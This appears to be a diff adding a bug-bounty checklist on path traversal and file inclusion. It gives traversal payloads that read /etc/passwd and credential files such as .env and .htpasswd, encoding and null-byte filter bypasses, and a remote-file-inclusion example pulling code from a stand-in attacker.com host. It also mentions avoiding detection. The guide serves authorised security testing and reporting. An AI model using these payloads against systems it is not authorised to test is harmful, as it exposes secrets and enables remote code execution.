@@ -1,0 +1,157 @@
+Here’s a detailed checklist for identifying and exploiting **Path Traversal** (also known as **Directory Traversal**) vulnerabilities during bug bounty hunting, including manual steps, tools, tips, and things you may wish you knew.
+
+### **1. Initial Information Gathering**
+
+#### **Step 1: Reconnaissance**
+- **Tools:**
+  - **Burp Suite** (with active scanner)
+  - **OWASP ZAP**
+  - **Amass** (for subdomain enumeration)
+  - **Subfinder** (for subdomain enumeration)
+  - **WhatWeb** or **Wappalyzer** (for technology stack detection)
+  - **Nmap** (for mapping open ports and services)
+
+- **Actions:**
+  - Gather URLs and subdomains that may lead to file-based operations (file upload, download, path parameters).
+  - Look for directories, file paths, and potential file handling mechanisms like `/uploads/`, `/images/`, `/files/`, or `/assets/`.
+  - Examine URL parameters to see if any refer to file paths or directories.
+
+#### **Tip:**
+- Path traversal vulnerabilities often occur in areas where files are uploaded or downloaded. Focus on input fields related to file handling.
+
+### **2. Scanning and Passive Recon**
+
+#### **Step 2: Automated Scanning for Path Traversal**
+- **Tools:**
+  - **Burp Suite Scanner** (automated scan for common file-based issues)
+  - **OWASP ZAP** (automated scan for path traversal)
+  - **Nikto** (for scanning known vulnerabilities like directory traversal)
+  
+- **Actions:**
+  - Run automated scans to detect path traversal vulnerabilities on URL parameters and file upload fields.
+  - Identify endpoints related to file handling, like `/download.php?file=`, `/getfile.php?file=`, or `/file.php?path=`.
+  - Check for improperly sanitized URL parameters that may lead to file system access.
+
+#### **Tip:**
+- While automated scanners can help, they may not identify complex or rare traversal vectors, so manual testing is crucial.
+
+### **3. Testing URL Parameters and File Uploads**
+
+#### **Step 3: Identifying Input Points (File Paths)**
+- **Actions:**
+  - Look for URL parameters that might accept file paths (e.g., `file=`, `path=`, `dir=`, `filename=`).
+  - Test for file upload or download features where user input is directly used in file paths.
+  - Identify any file inclusion mechanisms (like including a file from a given directory).
+
+#### **Step 4: Try Basic Path Traversal Payloads**
+- **Tools:**
+  - **Burp Suite** (to manipulate request parameters)
+  
+- **Actions:**
+  - Inject simple path traversal payloads into parameters: 
+    - `../../etc/passwd` (Linux)
+    - `..\..\Windows\System32\drivers\etc\hosts` (Windows)
+  - Attempt to access sensitive files like `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows).
+  - Look for errors or responses indicating the file was accessed.
+
+#### **Tip:**
+- Test both absolute and relative paths. For example, `file=../../../../../etc/passwd` or `file=/etc/passwd`.
+- In Windows environments, use backslashes (`\`) instead of forward slashes (`/`).
+
+### **4. Analyzing Responses**
+
+#### **Step 5: Examine Server Responses**
+- **Actions:**
+  - Review server responses for any signs of file disclosure, such as:
+    - Unexpected file contents in response bodies.
+    - File path or error messages indicating access to files outside the web root.
+  - Look for errors like "Directory traversal attack detected," or the file being returned directly in the response body.
+  
+#### **Tip:**
+- If the server returns a file or error message, you may be able to extract further information about the file system structure.
+
+### **5. Testing for Advanced Path Traversal**
+
+#### **Step 6: Bypass Filters**
+- **Tools:**
+  - **Burp Suite Intruder** (to fuzz different payloads)
+  - **Burp Suite Repeater** (to manually inject payloads)
+  
+- **Actions:**
+  - Try common encoding techniques to bypass filters:
+    - URL encoding: `%2E%2E%2F` for `../`
+    - Double URL encoding: `%252E%252E%252F` for `../`
+    - Unicode encoding: `..%c0%af` for `/`
+  - Test for directory traversal payloads with varying levels of encoding and manipulation.
+  
+#### **Tip:**
+- If input is being sanitized or blocked, try encoding payloads or using different payload variations.
+
+### **6. File Inclusion and External Access Testing**
+
+#### **Step 7: Test for Local File Inclusion (LFI)**
+- **Actions:**
+  - Try to include local files in parameters (e.g., `file=../../../../etc/passwd`).
+  - Check if file inclusion mechanisms are vulnerable to local file inclusion (LFI), where an attacker can load arbitrary files from the server.
+
+#### **Step 8: Test for Remote File Inclusion (RFI)**
+- **Actions:**
+  - Check if the application allows for the inclusion of external URLs or files (e.g., `file=http://attacker.com/maliciousfile.php`).
+  - If RFI is possible, it can lead to remote code execution or further compromise.
+
+#### **Tip:**
+- LFI and RFI vulnerabilities can be chained with other vulnerabilities to achieve code execution or full compromise of the system.
+
+### **7. Advanced Payloads and Exploitation**
+
+#### **Step 9: Test Path Traversal with Null Bytes (if applicable)**
+- **Tools:**
+  - **Burp Suite** (for testing null byte injection)
+
+- **Actions:**
+  - Some applications may use null byte (`%00`) to terminate file names. Inject null byte into file paths:
+    - `../../../../etc/passwd%00`
+  - Test if the null byte bypasses file extension restrictions or file validation checks.
+
+#### **Tip:**
+- Many modern systems and languages have fixed null byte handling, but older systems may still be vulnerable.
+
+### **8. Reporting Findings**
+
+#### **Step 10: Write Detailed Bug Report**
+- **Actions:**
+  - Provide a clear and concise description of the vulnerability: where it was found (URL, parameter), how to reproduce it, and the impact (access to sensitive files or system compromise).
+  - Include evidence of the attack (e.g., screenshots or HTTP responses showing the file contents).
+  - Suggest mitigations, such as:
+    - Input validation and sanitization.
+    - Restricting file path inputs to a limited set of directories.
+    - Use of security mechanisms like `chroot` or `open_basedir` (in PHP) to limit file access.
+
+#### **Tip:**
+- Always include a Proof of Concept (PoC), such as the URL with the payload that successfully demonstrates the vulnerability.
+
+---
+
+### **Things I Wish I Knew:**
+
+1. **Don’t Rely on Filters Alone**: Just because an application filters basic traversal attempts (like `../`) doesn’t mean it’s secure. Look for ways to bypass these filters through encoding or alternative payloads.
+
+2. **Look for File Upload and Download Features**: Path traversal vulnerabilities often appear in file upload and download functionalities, so always test those first.
+
+3. **Sensitive Files**: Common files to target are configuration files, database files, and authentication tokens (like `.env`, `.htpasswd`, `config.php`, `settings.json`).
+
+4. **Security Headers Help**: While not a fix for path traversal, security headers like `X-Content-Type-Options: nosniff` or `Content-Security-Policy` can sometimes help reduce the risk of exploitation.
+
+5. **Context is Everything**: Path traversal can be context-dependent. It might work in one part of the application (like file handling) but not in others (like URL-based parameters), so test thoroughly.
+
+6. **Error Messages Reveal Clues**: Pay close attention to error messages, as they often reveal directory structures or access control flaws.
+
+---
+
+### **Additional Tools:**
+- **DotDotPwn** (for advanced path traversal testing)
+- **Burp Suite Extensions** (for automated testing and payload generation)
+- **Nikto** (for known vulnerability scanning)
+- **FuzzDB** (for common fuzzing payloads)
+
+By following this checklist and applying these tips, you can effectively hunt for and exploit path traversal vulnerabilities while minimizing the risk of detection or false positives.
